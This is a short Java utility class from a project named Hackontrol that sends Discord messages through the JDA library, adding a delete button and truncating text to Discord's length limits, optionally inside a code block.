package com.khopan.hackontrol.utils;

import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.manager.common.sender.sendable.ISendable;

import net.dv8tion.jda.api.utils.messages.MessageCreateBuilder;

public class HackontrolMessage {
	private HackontrolMessage() {}

	public static void deletable(ISendable sender, String message) {
		if(message == null) {
			throw new NullPointerException("Message cannot be null");
		}

		HackontrolMessage.deletableInternal(sender, HackontrolMessage.limit(message, 2000));
	}

	public static void codeblockDeletable(ISendable sender, String message) {
		if(message == null) {
			throw new NullPointerException("Message cannot be null");
		}

		HackontrolMessage.deletableInternal(sender, HackontrolMessage.limitBlock(message));
	}

	private static void deletableInternal(ISendable sender, String message) {
		if(sender == null) {
			throw new NullPointerException("Sender cannot be null");
		}

		MessageCreateBuilder builder = new MessageCreateBuilder();
		builder.setContent(message);
		builder.addActionRow(HackontrolButton.delete());
		sender.send(builder.build(), ButtonManager :: dynamicButtonCallback);
	}

	private static String limitBlock(String text) {
		return "```\n" + HackontrolMessage.limit(text, 1992) + "\n```";
	}

	private static String limit(String text, int limit) {
		if(!text.isEmpty() && text.length() > limit) {
			text = text.substring(0, limit);
		}

		return text;
	}
}
